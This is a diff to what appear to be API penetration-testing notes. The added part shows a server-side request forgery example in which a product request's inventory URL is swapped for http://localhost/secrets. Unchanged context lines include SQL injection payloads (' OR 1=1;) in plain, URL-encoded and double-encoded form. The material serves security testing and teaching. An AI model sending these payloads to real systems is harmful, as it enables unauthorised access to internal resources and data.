@@ -108,6 +108,20 @@ Allows for user input that may result in a server retrieving resources
 Burp Collaborator
 Your own web server
 
+Intercepted Request:
+POST api/v1/store/products
+headers…
+{
+"inventory":"http://store.com/api/v3/inventory/item/12345"
+}
+
+Attack:
+POST api/v1/store/products
+headers…
+{
+"inventory":"§http://localhost/secrets§"
+ }
+
 
 Injection:
 
@@ -212,6 +226,7 @@ Double URL Encoded Payload
 ' OR 1=1;
 %27%20%4f%52%20%31%3d%31%3b
 %25%32%37%25%32%30%25%34%66%25%35%32%25%32%30%25%33%31%25%33%64%25%33%31%25%33%62
+
 
 BOLA:
 Valid Request:
